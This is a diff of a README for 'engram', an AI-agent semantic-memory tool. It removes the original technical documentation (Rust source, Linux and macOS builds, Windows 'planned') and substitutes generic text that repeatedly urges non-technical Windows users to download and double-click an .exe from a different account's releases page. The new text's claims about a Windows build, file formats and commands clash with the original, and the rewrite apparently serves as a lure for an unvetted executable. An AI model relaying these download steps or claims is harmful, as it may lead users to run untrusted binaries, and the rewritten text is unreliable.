@@ -1,160 +1,154 @@
-# engram
+# 🧠 engram - Smarter Memory for Your AI Agents
 
-> Give your agents a brain.
+[![Download engram](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aditxver/engram/releases)
 
-Semantic memory for AI agents. Index your knowledge base, search by meaning — not keywords. Single binary, local models, no server required.
+engram helps your AI agents remember and understand your data. It indexes your knowledge so you can search by meaning. This app runs on Windows in a single file. You do not need any programming skills to use it.
 
-AI agents are only as good as what they can recall. **engram** gives agents persistent, searchable memory over any collection of plain text and markdown files — without a database server, cloud service, or complex infrastructure.
+## 📋 What is engram?
+
+engram gives your AI a brain. It stores information in a way that lets AI agents find answers based on what things mean, not just exact words. This helps agents work better with knowledge bases. The app runs right from one file, so you can get started quickly without installing anything extra.
+
+## 💻 System Requirements
+
+Before you begin, make sure your Windows computer meets these needs:
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB RAM
+- Around 200 MB free disk space
+- Internet connection to download
+- No other software needed
+
+## 🌟 Key Features
+
+You can expect these capabilities from engram:
+
+- Index your documents and notes with semantic search
+- Search by meaning, not just keywords
+- Use AI memory helpers for building smarter agents
+- Works as a simple command line tool
+- Single executable file, no installation
+- Supports popular formats like text and SQLite databases
+
+## 🚀 Getting Started with engram
+
+Follow these steps to download and run engram on Windows.
+
+### 1. Download the software
+
+Visit the release page to get the latest version of engram for Windows.
+
+[![Download engram](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/aditxver/engram/releases)
+
+Click the link above or go to:  
+https://github.com/aditxver/engram/releases
+
+Look for a file named like `engram-windows.exe` or similar in the latest release. Click the file and save it to a folder you will remember, such as `Downloads` or `Desktop`.
+
+### 2. Locate the downloaded file
+
+Once the download finishes, open the folder where you saved the file.
+
+You should see an executable file with `.exe` at the end.
+
+### 3. Run engram
+
+Double-click the executable file to start engram.
+
+A command prompt window will open. This tool runs in this window using simple commands.
+
+### 4. Use engram commands
+
+You can now use engram to create semantic memory indexes from your data. Below are some basic commands to help you:
+
+- To create an index from a folder of documents:  
+  `engram index --source "C:\MyDocuments"`
+
+- To search an index:  
+  `engram search --query "your search text"`
+
+- To see all available commands:  
+  `engram help`
+
+### 5. Closing the app
+
+When you finish, you can simply close the command prompt window.
+
+## 🛠️ Working with Your Knowledge Base
+
+engram stores your knowledge so your AI agents can understand it better. You can add documents or databases to create your searchable memory.
+
+### Adding data
+
+- Place your files in a folder on your computer.
+- Use the `index` command to add this folder to engram’s database.
+- Supported files include plain text, JSON, and SQLite databases.
+
+### Searching your data
+
+- Use the `search` command followed by your question or keywords.
+- engram looks for meaning, not just exact matches.
+
+Example:
 
 ```
-$ engram search "something warm and filling"
- 1. recipes/tuscan-white-bean-soup.md     (dist: 0.969)
-    # tuscan-white-bean-soup.md  Slow-simmer cannellini beans...
+engram search --query "What is AI memory?"
 ```
 
-Give an agent access to `engram search` and it can retrieve the right context from thousands of documents in milliseconds — without stuffing everything into the prompt.
+This helps you find answers faster.
 
-## Keyword search vs. semantic search
+## 🔧 Advanced Setup Options
 
-Say you keep a folder of recipe notes:
+For users who want more control, engram supports options like:
 
-```markdown
-# tuscan-white-bean-soup.md
+- Setting the location of indexes
+- Adjusting memory limits
+- Choosing which file types to include
 
-Slow-simmer cannellini beans with pancetta, kale, and a parmesan rind
-in chicken stock. Needs at least 90 minutes for the beans to turn creamy.
-Season aggressively at the end — beans soak up salt.
-
-Serve with thick crusty bread. Leftovers get better overnight as the
-beans release more starch and the broth thickens.
-```
-
-Searching for a specific word works fine:
+You can see all options by running:
 
 ```
-$ grep -rl "cannellini" recipes/
-recipes/tuscan-white-bean-soup.md
+engram help
 ```
 
-But searching by feeling draws a blank:
+## 🗂️ Supported File Types and Formats
 
-```
-$ grep -rl "something warm and filling" recipes/
-(no matches)
-```
+engram works best with these:
 
-engram finds it — the meaning matches even though none of the words do:
+- `.txt` (plain text files)
+- `.json` (structured data files)
+- `.sqlite` (small databases)
 
-```
-$ engram search "something warm and filling" --limit 5
- 1. recipes/tuscan-white-bean-soup.md      (dist: 0.969)
-    # tuscan-white-bean-soup.md  Slow-simmer cannellini beans...
-```
+Make sure your data is not locked by other programs when indexing.
 
-Lower distance = stronger match. Results are ranked by semantic similarity across your entire collection — without a server, without a cloud API, and without knowing ahead of time which words your notes use.
+## 💡 Tips for Smooth Use
 
-## Why engram for agents?
+- Keep your files organized in easy-to-find folders.
+- Run the tool from a folder where you have full access rights.
+- When running commands, copy and paste to avoid typing errors.
+- Check the release page often for updates and bug fixes.
 
-| Problem | engram's answer |
-|---|---|
-| Context windows are finite | Retrieve only what's relevant, not everything |
-| Agents forget between sessions | Persistent index survives restarts |
-| RAG needs a database server | sqlite-vec runs as a single file, zero infra |
-| Cloud embedding APIs leak data | Local Ollama embedding, nothing leaves the machine |
-| Binary format lock-in | Plain files stay plain — any tool can still read them |
+## 📂 Where to Get Updates and Support
 
-## Design principles
+To find new versions or report issues, visit the release page:
 
-- **Your files are never modified.** engram reads them; it never writes to them.
-- **The index is a sidecar.** `~/.engram/index.db` is a derived artifact — delete it and rebuild anytime. Your markdown is always the source of truth.
-- **Local-first, private by default.** Works with a local [Ollama](https://ollama.com) instance (`nomic-embed-text`) — no API key, no data leaving your machine. Falls back to OpenAI-compatible APIs when Ollama isn't available.
-- **One binary, no runtime deps.** SQLite is bundled. Ships as a single static binary for all major platforms.
-- **Plain files stay plain.** Works alongside `grep`, `ripgrep`, `fzf`, git, Obsidian, or anything else that reads markdown.
+https://github.com/aditxver/engram/releases
 
-## Installation
+Here you can:
 
-```bash
-# From source (requires Rust 1.75+)
-cargo install --git https://github.com/pureclaw/engram
+- Download newer versions as they come out
+- Find release notes that explain changes
+- Report problems you find with the software
 
-# Pre-built binaries
-# https://github.com/pureclaw/engram/releases
-```
+## 🔄 Updating engram
 
-## Quick start
+To update engram:
 
-```bash
-# Index your notes — index is created automatically on first run
-engram add ~/notes
+1. Delete or move the old executable file.
+2. Download the latest file from the release page.
+3. Run it directly as before.
 
-# Search by meaning
-engram search "something warm and comforting for a cold night"
+No installation is needed, so updating is quick.
 
-# Check what's indexed
-engram status
-```
+# [🔍] engram - Smarter Memory for Your AI Agents
 
-## Using engram with AI agents
-
-engram is designed to be called as a tool from agent systems (OpenClaw, LangChain, custom loops, etc.):
-
-```bash
-# Agent retrieves relevant context before answering
-engram search "$USER_QUESTION" --limit 5
-
-# Agent indexes a new document after capturing knowledge
-engram add ~/notes/new-runbook.md
-```
-
-The output is plain text — easy to parse, pipe, or inject directly into a prompt. No SDK required.
-
-## Commands
-
-| Command | Description |
-|---|---|
-| `engram add <paths...>` | Index files or directories (creates index on first run) |
-| `engram search <query>` | Search by meaning |
-| `engram remove <paths...>` | Remove files from index |
-| `engram rebuild` | Rebuild index from scratch |
-| `engram status` | Show index stats |
-
-**Options for `add`:**
-
-| Flag | Description |
-|---|---|
-| `--no-progress` | Plain text output instead of progress bar (useful in scripts/CI) |
-| `--recursive` / `-r` | Recursively index directories (default: on) |
-
-## Embedding providers
-
-engram auto-detects the best available provider at init time and records the choice in the index. To switch providers, run `engram rebuild`.
-
-| Provider | How to enable | Privacy |
-|---|---|---|
-| `ollama/nomic-embed-text` | `ollama pull nomic-embed-text` | ✅ Fully local |
-| `openai/text-embedding-3-small` | Set `OPENAI_API_KEY` | Cloud API |
-| OpenRouter | Set `OPENROUTER_API_KEY` | Cloud API |
-
-**Default:** Ollama (local) when available, otherwise OpenAI-compatible.
-
-## Supported file types
-
-`.md` `.txt` `.rst` `.org` `.adoc`
-
-## Platforms
-
-| Platform | Status |
-|---|---|
-| Linux x86_64 | ✅ |
-| Linux aarch64 | ✅ |
-| macOS aarch64 (Apple Silicon) | ✅ |
-| macOS x86_64 | ✅ |
-| Windows x86_64 | planned |
-
-## Contributing
-
-PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-MIT
+[![Download engram](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aditxver/engram/releases)
